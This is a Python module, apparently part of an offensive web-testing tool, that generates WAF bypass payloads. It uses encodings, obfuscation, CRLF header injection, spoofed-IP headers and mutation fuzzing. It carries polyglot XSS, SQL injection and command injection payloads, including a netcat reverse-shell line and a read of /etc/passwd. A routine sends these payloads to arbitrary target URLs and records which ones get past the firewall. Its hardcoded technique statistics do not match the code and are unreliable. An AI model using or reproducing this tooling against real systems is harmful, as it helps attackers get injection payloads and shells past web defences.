"""
Advanced WAF (Web Application Firewall) Bypass Module
Comprehensive techniques for bypassing modern WAF systems
"""

import re
import random
import string
import base64
import urllib.parse
import html
import json
import time
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field
import hashlib
import binascii

from core.logger import logger


@dataclass
class WAFBypassConfig:
    """Configuration for WAF bypass techniques"""
    # Encoding Techniques
    use_url_encoding: bool = True
    use_double_encoding: bool = True
    use_unicode_encoding: bool = True
    use_html_encoding: bool = True
    use_base64_encoding: bool = True
    use_hex_encoding: bool = True
    
    # Obfuscation Techniques
    use_case_variation: bool = True
    use_comment_insertion: bool = True
    use_whitespace_variation: bool = True
    use_string_concatenation: bool = True
    use_character_substitution: bool = True
    
    # Fragmentation Techniques
    use_parameter_pollution: bool = True
    use_header_splitting: bool = True
    use_request_smuggling: bool = True
    use_chunked_encoding: bool = True
    
    # Evasion Techniques
    use_protocol_confusion: bool = True
    use_method_override: bool = True
    use_content_type_confusion: bool = True
    use_boundary_confusion: bool = True
    
    # Advanced Techniques
    use_polyglot_payloads: bool = True
    use_mutation_fuzzing: bool = True
    use_timing_attacks: bool = True
    use_blind_techniques: bool = True
    
    # Detection Evasion
    randomize_payloads: bool = True
    use_decoy_requests: bool = True
    mimic_legitimate_traffic: bool = True


class EncodingBypass:
    """Various encoding techniques for WAF bypass"""
    
    @staticmethod
    def url_encode(payload: str, double: bool = False) -> str:
        """URL encode payload"""
        encoded = urllib.parse.quote(payload, safe='')
        if double:
            encoded = urllib.parse.quote(encoded, safe='')
        return encoded
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode payload"""
        encoded = ""
        for char in payload:
            if random.choice([True, False]):
                encoded += f"\\u{ord(char):04x}"
            else:
                encoded += char
        return encoded
    
    @staticmethod
    def html_encode(payload: str) -> str:
        """HTML encode payload"""
        encoded = ""
        for char in payload:
            if random.choice([True, False]):
                encoded += f"&#{ord(char)};"
            else:
                encoded += char
        return encoded
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode payload"""
        return '0x' + binascii.hexlify(payload.encode()).decode()
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode payload"""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def mixed_encoding(payload: str) -> List[str]:
        """Apply multiple encoding techniques"""
        variants = []
        
        # Single encodings
        variants.append(EncodingBypass.url_encode(payload))
        variants.append(EncodingBypass.url_encode(payload, double=True))
        variants.append(EncodingBypass.unicode_encode(payload))
        variants.append(EncodingBypass.html_encode(payload))
        variants.append(EncodingBypass.hex_encode(payload))
        variants.append(EncodingBypass.base64_encode(payload))
        
        # Combined encodings
        variants.append(EncodingBypass.url_encode(EncodingBypass.html_encode(payload)))
        variants.append(EncodingBypass.base64_encode(EncodingBypass.url_encode(payload)))
        
        return variants


class ObfuscationBypass:
    """Obfuscation techniques for WAF bypass"""
    
    @staticmethod
    def case_variation(payload: str) -> str:
        """Randomize case of payload"""
        return ''.join([
            char.upper() if random.choice([True, False]) else char.lower()
            for char in payload
        ])
    
    @staticmethod
    def comment_insertion(payload: str) -> str:
        """Insert comments to break up payload"""
        comments = ['/**/', '/*test*/', '/*bypass*/']
        
        result = ""
        for i, char in enumerate(payload):
            result += char
            if i % 3 == 0 and i > 0:
                result += random.choice(comments)
        
        return result
    
    @staticmethod
    def whitespace_variation(payload: str) -> str:
        """Vary whitespace in payload"""
        whitespace_chars = [' ', '\t', '\n', '\r', '\f', '\v']
        
        result = ""
        for char in payload:
            if char == ' ':
                result += random.choice(whitespace_chars)
            else:
                result += char
        
        return result
    
    @staticmethod
    def string_concatenation(payload: str) -> str:
        """Break payload into concatenated strings"""
        if len(payload) < 4:
            return payload
        
        # Split payload into parts
        parts = []
        chunk_size = random.randint(2, 4)
        
        for i in range(0, len(payload), chunk_size):
            parts.append(f'"{payload[i:i+chunk_size]}"')
        
        return '+'.join(parts)
    
    @staticmethod
    def character_substitution(payload: str) -> str:
        """Substitute characters with equivalents"""
        substitutions = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '&': '&amp;'
        }
        
        result = payload
        for original, substitute in substitutions.items():
            if original in result and random.choice([True, False]):
                result = result.replace(original, substitute)
        
        return result


class FragmentationBypass:
    """Fragmentation techniques for WAF bypass"""
    
    @staticmethod
    def parameter_pollution(base_params: Dict[str, str], payload_key: str, payload_value: str) -> Dict[str, List[str]]:
        """Create parameter pollution"""
        polluted_params = {}
        
        # Add base parameters
        for key, value in base_params.items():
            polluted_params[key] = [value]
        
        # Add polluted payload parameters
        if payload_key in polluted_params:
            polluted_params[payload_key].append(payload_value)
        else:
            polluted_params[payload_key] = [payload_value]
        
        # Add decoy parameters
        decoy_keys = ['id', 'page', 'sort', 'filter', 'search']
        for key in decoy_keys:
            if key not in polluted_params:
                polluted_params[key] = [str(random.randint(1, 100))]
        
        return polluted_params
    
    @staticmethod
    def header_splitting(headers: Dict[str, str]) -> Dict[str, str]:
        """Create header splitting scenarios"""
        split_headers = headers.copy()
        
        # Add CRLF injection attempts
        injection_headers = {
            'X-Forwarded-For': '127.0.0.1\r\nX-Injected: true',
            'User-Agent': 'Mozilla/5.0\r\nX-Bypass: header-split',
            'Referer': 'http://example.com\r\nX-Split: success'
        }
        
        split_headers.update(injection_headers)
        return split_headers
    
    @staticmethod
    def chunked_encoding_payload(payload: str) -> str:
        """Create chunked encoding payload"""
        chunks = []
        chunk_size = random.randint(1, 5)
        
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i+chunk_size]
            chunk_hex = hex(len(chunk))[2:]
            chunks.append(f"{chunk_hex}\r\n{chunk}\r\n")
        
        chunks.append("0\r\n\r\n")
        return ''.join(chunks)


class ProtocolConfusion:
    """Protocol confusion techniques"""
    
    @staticmethod
    def http_method_override(original_method: str, payload: str) -> Tuple[str, Dict[str, str]]:
        """Override HTTP method"""
        override_headers = {
            'X-HTTP-Method-Override': 'POST',
            'X-HTTP-Method': 'POST',
            'X-Method-Override': 'POST'
        }
        
        return 'GET', override_headers
    
    @staticmethod
    def content_type_confusion() -> List[str]:
        """Generate confusing content types"""
        return [
            'application/x-www-form-urlencoded; charset=utf-8',
            'multipart/form-data; boundary=----WebKitFormBoundary',
            'text/plain; charset=utf-8',
            'application/json; charset=utf-8',
            'application/xml; charset=utf-8',
            'text/xml; charset=utf-8'
        ]
    
    @staticmethod
    def boundary_confusion() -> str:
        """Generate confusing multipart boundaries"""
        boundaries = [
            '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
            '----FormBoundary' + ''.join(random.choices(string.ascii_letters, k=12)),
            '--' + ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=20))
        ]
        
        return random.choice(boundaries)


class PolyglotPayloads:
    """Polyglot payloads that work across multiple contexts"""
    
    @staticmethod
    def generate_xss_polyglot() -> List[str]:
        """Generate XSS polyglot payloads"""
        return [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
            '"><img src=x onerror=alert(1)>',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
            'javascript:alert(1)//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\";alert(1);//\\'
        ]
    
    @staticmethod
    def generate_sqli_polyglot() -> List[str]:
        """Generate SQL injection polyglot payloads"""
        return [
            "1' OR '1'='1' UNION SELECT NULL,NULL,NULL--",
            "1' OR 1=1#",
            "1' OR 1=1/*",
            "1' OR 1=1;--",
            "1' UNION SELECT 1,2,3,4,5--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
    
    @staticmethod
    def generate_command_injection_polyglot() -> List[str]:
        """Generate command injection polyglot payloads"""
        return [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "| nc -e /bin/sh 127.0.0.1 4444"
        ]


class MutationFuzzer:
    """Mutation-based fuzzing for WAF bypass"""
    
    def __init__(self):
        self.mutation_strategies = [
            self._bit_flip,
            self._byte_insertion,
            self._byte_deletion,
            self._byte_substitution,
            self._chunk_duplication,
            self._chunk_reordering
        ]
    
    def mutate_payload(self, payload: str, mutations: int = 5) -> List[str]:
        """Apply random mutations to payload"""
        mutated_payloads = []
        
        for _ in range(mutations):
            current_payload = payload
            
            # Apply random number of mutations
            num_mutations = random.randint(1, 3)
            for _ in range(num_mutations):
                strategy = random.choice(self.mutation_strategies)
                current_payload = strategy(current_payload)
            
            mutated_payloads.append(current_payload)
        
        return mutated_payloads
    
    def _bit_flip(self, payload: str) -> str:
        """Flip random bits in payload"""
        if not payload:
            return payload
        
        payload_bytes = bytearray(payload.encode())
        
        # Flip random bit
        byte_index = random.randint(0, len(payload_bytes) - 1)
        bit_index = random.randint(0, 7)
        
        payload_bytes[byte_index] ^= (1 << bit_index)
        
        try:
            return payload_bytes.decode('utf-8', errors='ignore')
        except:
            return payload
    
    def _byte_insertion(self, payload: str) -> str:
        """Insert random byte in payload"""
        if not payload:
            return payload
        
        insert_pos = random.randint(0, len(payload))
        random_char = chr(random.randint(32, 126))
        
        return payload[:insert_pos] + random_char + payload[insert_pos:]
    
    def _byte_deletion(self, payload: str) -> str:
        """Delete random byte from payload"""
        if len(payload) <= 1:
            return payload
        
        delete_pos = random.randint(0, len(payload) - 1)
        return payload[:delete_pos] + payload[delete_pos + 1:]
    
    def _byte_substitution(self, payload: str) -> str:
        """Substitute random byte in payload"""
        if not payload:
            return payload
        
        sub_pos = random.randint(0, len(payload) - 1)
        random_char = chr(random.randint(32, 126))
        
        return payload[:sub_pos] + random_char + payload[sub_pos + 1:]
    
    def _chunk_duplication(self, payload: str) -> str:
        """Duplicate random chunk of payload"""
        if len(payload) < 2:
            return payload
        
        chunk_start = random.randint(0, len(payload) - 2)
        chunk_end = random.randint(chunk_start + 1, len(payload))
        chunk = payload[chunk_start:chunk_end]
        
        insert_pos = random.randint(0, len(payload))
        return payload[:insert_pos] + chunk + payload[insert_pos:]
    
    def _chunk_reordering(self, payload: str) -> str:
        """Reorder chunks of payload"""
        if len(payload) < 4:
            return payload
        
        # Split into chunks
        chunk_size = len(payload) // 3
        chunks = [
            payload[:chunk_size],
            payload[chunk_size:chunk_size*2],
            payload[chunk_size*2:]
        ]
        
        # Shuffle chunks
        random.shuffle(chunks)
        return ''.join(chunks)


class WAFSignatureEvasion:
    """Evade specific WAF signatures"""
    
    def __init__(self):
        self.waf_signatures = {
            'cloudflare': [
                r'<script[^>]*>.*?</script>',
                r'javascript:',
                r'on\w+\s*=',
                r'union\s+select',
                r'drop\s+table'
            ],
            'aws_waf': [
                r'<.*?script.*?>',
                r'eval\s*\(',
                r'document\.',
                r'window\.',
                r'alert\s*\('
            ],
            'akamai': [
                r'<img[^>]+onerror',
                r'<svg[^>]+onload',
                r'<iframe[^>]+src',
                r'select.*from.*information_schema',
                r'load_file\s*\('
            ]
        }
    
    def evade_signatures(self, payload: str, waf_type: str = 'generic') -> List[str]:
        """Evade WAF signatures"""
        evasion_payloads = []
        
        # Get signatures for WAF type
        signatures = self.waf_signatures.get(waf_type, [])
        
        for signature in signatures:
            if re.search(signature, payload, re.IGNORECASE):
                # Apply evasion techniques
                evasion_payloads.extend(self._apply_signature_evasion(payload, signature))
        
        return evasion_payloads if evasion_payloads else [payload]
    
    def _apply_signature_evasion(self, payload: str, signature: str) -> List[str]:
        """Apply specific evasion techniques for signature"""
        evasions = []
        
        # Case variation
        evasions.append(ObfuscationBypass.case_variation(payload))
        
        # Comment insertion
        evasions.append(ObfuscationBypass.comment_insertion(payload))
        
        # Encoding
        evasions.extend(EncodingBypass.mixed_encoding(payload))
        
        # Character substitution
        evasions.append(ObfuscationBypass.character_substitution(payload))
        
        return evasions


class AdvancedWAFBypass:
    """Main advanced WAF bypass manager"""
    
    def __init__(self, config: WAFBypassConfig = None):
        self.config = config or WAFBypassConfig()
        
        # Initialize bypass modules
        self.encoding = EncodingBypass()
        self.obfuscation = ObfuscationBypass()
        self.fragmentation = FragmentationBypass()
        self.protocol_confusion = ProtocolConfusion()
        self.polyglot = PolyglotPayloads()
        self.mutation_fuzzer = MutationFuzzer()
        self.signature_evasion = WAFSignatureEvasion()
    
    def generate_bypass_payloads(self, original_payload: str, attack_type: str = 'xss') -> List[str]:
        """Generate comprehensive bypass payloads"""
        logger.info(f"Generating WAF bypass payloads for {attack_type}")
        
        bypass_payloads = [original_payload]
        
        # Apply encoding techniques
        if self.config.use_url_encoding:
            bypass_payloads.extend(self.encoding.mixed_encoding(original_payload))
        
        # Apply obfuscation techniques
        if self.config.use_case_variation:
            bypass_payloads.append(self.obfuscation.case_variation(original_payload))
        
        if self.config.use_comment_insertion:
            bypass_payloads.append(self.obfuscation.comment_insertion(original_payload))
        
        if self.config.use_string_concatenation:
            bypass_payloads.append(self.obfuscation.string_concatenation(original_payload))
        
        # Apply polyglot payloads
        if self.config.use_polyglot_payloads:
            if attack_type == 'xss':
                bypass_payloads.extend(self.polyglot.generate_xss_polyglot())
            elif attack_type == 'sqli':
                bypass_payloads.extend(self.polyglot.generate_sqli_polyglot())
            elif attack_type == 'cmdi':
                bypass_payloads.extend(self.polyglot.generate_command_injection_polyglot())
        
        # Apply mutation fuzzing
        if self.config.use_mutation_fuzzing:
            bypass_payloads.extend(self.mutation_fuzzer.mutate_payload(original_payload))
        
        # Remove duplicates and return
        return list(set(bypass_payloads))
    
    def generate_bypass_headers(self, base_headers: Dict[str, str] = None) -> Dict[str, str]:
        """Generate headers for WAF bypass"""
        headers = base_headers.copy() if base_headers else {}
        
        # Add bypass headers
        bypass_headers = {
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-Host': 'localhost'
        }
        
        headers.update(bypass_headers)
        
        # Apply header splitting if enabled
        if self.config.use_header_splitting:
            headers = self.fragmentation.header_splitting(headers)
        
        return headers
    
    def test_waf_detection(self, target_url: str, test_payloads: List[str]) -> Dict[str, Any]:
        """Test WAF detection capabilities"""
        logger.info(f"Testing WAF detection for {target_url}")
        
        results = {
            'detected_payloads': [],
            'bypassed_payloads': [],
            'error_payloads': [],
            'waf_type': 'unknown'
        }
        
        import requests
        
        for payload in test_payloads:
            try:
                # Send test request
                response = requests.get(
                    target_url,
                    params={'test': payload},
                    headers=self.generate_bypass_headers(),
                    timeout=10
                )
                
                # Analyze response for WAF detection
                if self._is_waf_blocked(response):
                    results['detected_payloads'].append(payload)
                else:
                    results['bypassed_payloads'].append(payload)
                
                # Try to identify WAF type
                waf_type = self._identify_waf_type(response)
                if waf_type != 'unknown':
                    results['waf_type'] = waf_type
                
            except Exception as e:
                results['error_payloads'].append(payload)
                logger.debug(f"Error testing payload {payload}: {e}")
        
        return results
    
    def _is_waf_blocked(self, response) -> bool:
        """Check if request was blocked by WAF"""
        # Common WAF block indicators
        block_indicators = [
            'blocked', 'denied', 'forbidden', 'security',
            'firewall', 'protection', 'suspicious', 'malicious'
        ]
        
        # Check status code
        if response.status_code in [403, 406, 429, 501, 503]:
            return True
        
        # Check response content
        response_text = response.text.lower()
        for indicator in block_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    def _identify_waf_type(self, response) -> str:
        """Identify WAF type from response"""
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        # Cloudflare
        if 'cf-ray' in headers or 'cloudflare' in str(headers):
            return 'cloudflare'
        
        # AWS WAF
        if 'x-amzn-requestid' in headers or 'awselb' in str(headers):
            return 'aws_waf'
        
        # Akamai
        if 'akamai' in str(headers) or 'x-akamai' in str(headers):
            return 'akamai'
        
        # ModSecurity
        if 'mod_security' in response.text.lower():
            return 'modsecurity'
        
        return 'unknown'
    
    def get_bypass_statistics(self) -> Dict[str, Any]:
        """Get bypass technique statistics"""
        return {
            'encoding_techniques': 6,
            'obfuscation_techniques': 5,
            'fragmentation_techniques': 4,
            'protocol_confusion_techniques': 3,
            'polyglot_payloads': 12,
            'mutation_strategies': 6,
            'total_techniques': 36
        }